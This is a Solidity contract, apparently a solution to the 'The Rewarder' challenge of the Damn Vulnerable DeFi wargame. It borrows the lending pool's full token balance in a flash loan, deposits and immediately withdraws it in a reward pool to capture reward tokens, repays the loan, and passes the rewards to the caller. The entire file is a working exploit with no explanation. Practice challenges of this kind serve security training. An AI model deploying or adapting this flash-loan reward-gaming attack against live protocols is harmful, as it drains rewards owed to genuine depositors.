// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract FlashLoanerPoolExploit {
    address immutable pool;
    address immutable rpool;
    address immutable token;
    address immutable rtoken;

    constructor(
        address _pool,
        address _rpool,
        address _token,
        address _rtoken
    ) {
        pool = _pool;
        rpool = _rpool;
        token = _token;
        rtoken = _rtoken;
    }

    function start(uint256 amount) public {
        uint256 _amt = amount;
        if (_amt == 0) {
            _amt = DamnValuableToken(token).balanceOf(pool);
        }
        DamnValuableToken(token).approve(rpool, _amt);
        FlashLoanerPool(pool).flashLoan(_amt);
    }

    function withdraw() public {
        uint256 rewards = RewardToken(rtoken).balanceOf(address(this));
        RewardToken(rtoken).transfer(msg.sender, rewards);
    }

    function receiveFlashLoan(uint256 amount) external {
        TheRewarderPool(rpool).deposit(amount);
        TheRewarderPool(rpool).withdraw(amount);
        DamnValuableToken(token).transfer(pool, amount);
    }

    receive() external payable {}
}
